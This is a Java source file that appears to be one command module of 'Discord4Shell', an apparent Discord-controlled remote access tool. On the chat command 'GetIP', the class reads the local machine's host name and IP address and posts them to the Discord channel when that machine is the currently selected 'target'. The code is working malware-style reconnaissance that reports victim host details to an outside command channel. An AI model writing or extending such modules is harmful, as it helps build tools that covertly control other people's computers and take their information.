package org.example.commands;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Objects;

import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;

public class GetHostMessage extends ListenerAdapter {

    String IP = "none";
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().equalsIgnoreCase("GetIP")) {
            try {
                IP = String.valueOf(InetAddress.getLocalHost());
            } catch (UnknownHostException e) {
                throw new RuntimeException(e);
            }
            if(Objects.equals(SelectedTarget, user)) {
                event.getChannel().sendMessage(IP).queue();
            }
        }
    }
}
